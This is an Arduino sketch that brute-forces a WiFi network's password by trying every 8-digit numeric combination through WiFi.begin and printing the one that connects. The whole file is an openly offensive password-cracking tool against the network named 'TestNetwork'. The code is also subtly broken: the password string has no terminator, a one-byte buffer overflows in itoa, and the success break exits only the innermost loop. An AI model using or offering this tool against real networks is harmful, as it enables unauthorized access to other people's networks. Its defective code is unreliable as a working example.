#include <SPI.h>
#include <WiFiNINA.h>
#include <string.h>

//char pass[32] = "";
char ssid[] = "TestNetwork";

int tries = 0;

void setup() {
  Serial.begin(9600);
  while (!Serial) ;
  Serial.println("Serial is ready");

  brute_8char_onlynum();

  Serial.println("End of sketch");
}

void loop() {

}

void brute_8char_onlynum() {
  bool breaked = false;
  //char true_password[8];
  for (int c1 = 0; c1 <= 9; c1++) {
    for (int c2 = 0; c2 <= 9; c2++) {
      for (int c3 = 0; c3 <= 9; c3++) {
        for (int c4 = 0; c4 <= 9; c4++) {
          for (int c5 = 0; c5 <= 9; c5++) {
            for (int c6 = 0; c6 <= 9; c6++) {
              for (int c7 = 0; c7 <= 9; c7++) {
                for (int c8 = 0; c8 <= 9; c8++) {
                  // Construct password
                  char password[8] = "";                
                  char buffer[1];
                  itoa(c1, buffer, 10);
                  password[0] = buffer[0];
                  itoa(c2, buffer, 10);
                  password[1] = buffer[0];
                  itoa(c3, buffer, 10);
                  password[2] = buffer[0];
                  itoa(c4, buffer, 10);
                  password[3] = buffer[0];
                  itoa(c5, buffer, 10);
                  password[4] = buffer[0];
                  itoa(c6, buffer, 10);
                  password[5] = buffer[0];
                  itoa(c7, buffer, 10);
                  password[6] = buffer[0];
                  itoa(c8, buffer, 10);
                  password[7] = buffer[0];
                  // Break if connected
                  WiFi.begin(ssid, password);
                  tries++;
                  Serial.println("Attempting to connect");
                  Serial.print("Current password: "); Serial.println(password);
                  Serial.print("Current attempt: "); Serial.println(tries);
                  if (WiFi.status() == WL_CONNECTED) {
                    breaked = true;
                    Serial.println("Bruteforce successfully");
                    Serial.print("Password: "); Serial.println(password);
                    Serial.print("Attempts: "); Serial.println(tries);
                    break;
                  }
                }
              }    
            }
          }        
        }
      }    
    }
  }
  if (!breaked) {
    Serial.println("Attempt brute-force failed");
  }
  
}
